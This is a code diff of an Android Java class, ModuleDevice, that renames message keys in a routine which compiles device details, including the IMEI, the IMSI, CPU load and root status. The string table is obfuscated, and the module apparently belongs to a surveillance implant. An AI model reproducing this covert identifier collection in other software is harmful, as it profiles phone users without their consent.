@@ -102,34 +102,34 @@ public class ModuleDevice extends BaseInstantModule {
 		}
 
 		// SYSTEM
-		sb.append(Messages.getString("9.3") + "\n"); //$NON-NLS-1$
-		sb.append(Messages.getString("9.22") + Build.BOARD + "\n");
-		sb.append(Messages.getString("9.23") + Build.BRAND + "\n");
-		sb.append(Messages.getString("9.24") + Build.DEVICE + "\n");
-		sb.append(Messages.getString("9.25") + Build.MODEL + "\n");
-		sb.append(Messages.getString("9.26") + Build.DISPLAY + "\n");
+		sb.append(Messages.getString("9_3") + "\n"); //$NON-NLS-1$
+		sb.append(Messages.getString("9_22") + Build.BOARD + "\n");
+		sb.append(Messages.getString("9_23") + Build.BRAND + "\n");
+		sb.append(Messages.getString("9_24") + Build.DEVICE + "\n");
+		sb.append(Messages.getString("9_25") + Build.MODEL + "\n");
+		sb.append(Messages.getString("9_26") + Build.DISPLAY + "\n");
 
-		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9_4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(Messages.getString("9.6") + "\n"); //$NON-NLS-1$
+			sb.append(Messages.getString("9_6") + "\n"); //$NON-NLS-1$
 		} else {
-			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(Messages.getString("9_7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		sb.append(Messages.getString("9.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9_9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9_11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9_13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Cfg.DEBUG) {
 			if (Status.self().haveRoot()) {
-				sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
+				sb.append(Messages.getString("9_15") + "\n"); //$NON-NLS-1$
 			} else {
-				sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
+				sb.append(Messages.getString("9_16") + "\n"); //$NON-NLS-1$
 			}
 		}
 
-		sb.append(Messages.getString("9.17") + "\n"); //$NON-NLS-1$
+		sb.append(Messages.getString("9_17") + "\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
@@ -165,7 +165,7 @@ public class ModuleDevice extends BaseInstantModule {
 	private void readCpuUsage() {
 		try {
 			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
-					Messages.getString("9.21"))), //$NON-NLS-1$
+					Messages.getString("9_21"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
